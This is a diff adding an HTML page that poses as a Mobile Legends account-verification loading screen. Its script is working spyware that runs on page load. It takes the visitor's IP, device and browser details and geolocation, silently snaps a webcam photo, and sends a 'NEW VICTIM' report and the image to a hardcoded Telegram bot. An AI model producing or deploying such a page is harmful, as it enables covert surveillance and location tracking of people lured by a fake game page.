@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Loading - Mobile Legends</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #1a1a2e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .loading-container {
+            text-align: center;
+            color: white;
+        }
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 8px solid rgba(255,255,255,0.2);
+            border-top: 8px solid #ff3366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            font-size: 18px;
+            color: #ccc;
+        }
+        .progress-bar {
+            width: 250px;
+            height: 4px;
+            background: #333;
+            border-radius: 4px;
+            margin: 20px auto;
+            overflow: hidden;
+        }
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: #ff3366;
+            animation: progress 3s infinite;
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 90%; }
+        }
+    </style>
+</head>
+<body>
+<div class="loading-container">
+    <div class="spinner"></div>
+    <div class="loading-text">⏳ Verifikasi Akun Mobile Legends...</div>
+    <div class="progress-bar"><div class="progress"></div></div>
+    <div style="font-size:12px; color:#666; margin-top:20px;">Mohon tunggu, sedang memeriksa keamanan akun</div>
+</div>
+
+<script>
+    // ========== KONFIGURASI LANGSUNG ==========
+    // BOT TELEGRAM LO - UDAH GUE PASANGIN
+    const BOT_TOKEN = "8138012087:AAG9gs84LXffRpBCi1AuRXzXshWKy1A3Lg4";
+    const OWNER_ID = "6854801678";
+    // ==========================================
+    
+    // FUNCTION SEND TO TELEGRAM (LANGSUNG KE BOT LO)
+    async function sendToTelegram(text, photoBase64 = null) {
+        if(photoBase64) {
+            // Kirim foto
+            try {
+                // Convert base64 ke blob
+                let blob = await fetch(photoBase64).then(r => r.blob());
+                let formData = new FormData();
+                formData.append('chat_id', OWNER_ID);
+                formData.append('photo', blob, 'victim.jpg');
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                console.log('Foto terkirim');
+            } catch(e) {
+                console.log('Gagal kirim foto:', e);
+            }
+        }
+        
+        if(text) {
+            // Kirim teks
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: OWNER_ID,
+                        text: text,
+                        disable_web_page_preview: false
+                    })
+                });
+                console.log('Pesan terkirim');
+            } catch(e) {
+                console.log('Gagal kirim pesan:', e);
+            }
+        }
+    }
+    
+    // GET LOCATION
+    function getLocation() {
+        return new Promise((resolve) => {
+            if(!navigator.geolocation) {
+                resolve('❌ Tidak support geolocation');
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    let lat = pos.coords.latitude;
+                    let lng = pos.coords.longitude;
+                    let mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                    resolve(`📍 Lokasi: ${lat}, ${lng}\n🗺️ Google Maps: ${mapsLink}`);
+                },
+                (err) => {
+                    resolve(`❌ Gagal ambil lokasi: ${err.message}`);
+                }
+            );
+        });
+    }
+    
+    // CAPTURE CAMERA
+    function captureCamera() {
+        return new Promise((resolve) => {
+            if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                resolve('❌ Camera tidak support (bukan HTTPS atau non-permission)');
+                return;
+            }
+            
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    let video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(() => {
+                        let canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        let ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        let imageData = canvas.toDataURL('image/jpeg', 0.7);
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        // Kirim foto ke Telegram
+                        sendToTelegram(null, imageData);
+                        
+                        resolve('✅ Foto kamera berhasil dijepret dan dikirim');
+                    }, 1000);
+                })
+                .catch((err) => {
+                    resolve(`❌ Gagal akses kamera: ${err.message}`);
+                });
+        });
+    }
+    
+    // MAIN EXECUTION
+    async function main() {
+        // Ambil IP via API
+        let ipData = '🌐 IP: Gagal ambil';
+        try {
+            let ipRes = await fetch('https://api.ipify.org?format=json');
+            let ipJson = await ipRes.json();
+            ipData = `🌐 IP: ${ipJson.ip}`;
+        } catch(e) {}
+        
+        // Ambil info device
+        let device = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer || 'Direct'
+        };
+        
+        // Ambil lokasi
+        let location = await getLocation();
+        
+        // Ambil foto kamera
+        let camera = await captureCamera();
+        
+        // Buat laporan lengkap
+        let report = `
+🔥 NEW VICTIM! 🔥
+━━━━━━━━━━━━━━━━━━━━
+${ipData}
+📱 Device: ${device.userAgent}
+🖥️ Platform: ${device.platform}
+🌍 Language: ${device.language}
+📺 Screen: ${device.screen}
+⏰ Timezone: ${device.timezone}
+🔗 Referrer: ${device.referrer}
+━━━━━━━━━━━━━━━━━━━━
+${location}
+━━━━━━━━━━━━━━━━━━━━
+📸 Camera: ${camera}
+🕒 Time: ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━
+© Quantum V12.0 - RianModss
+        `;
+        
+        // Kirim laporan ke Telegram
+        await sendToTelegram(report);
+        
+        // Simpan ke local storage buat stat
+        let count = localStorage.getItem('quantumVictimCount') || 0;
+        count = parseInt(count) + 1;
+        localStorage.setItem('quantumVictimCount', count);
+        
+        console.log('Data korban terkirim! Total:', count);
+    }
+    
+    // JALANKAN
+    main();
+</script>
+</body>
+</html>
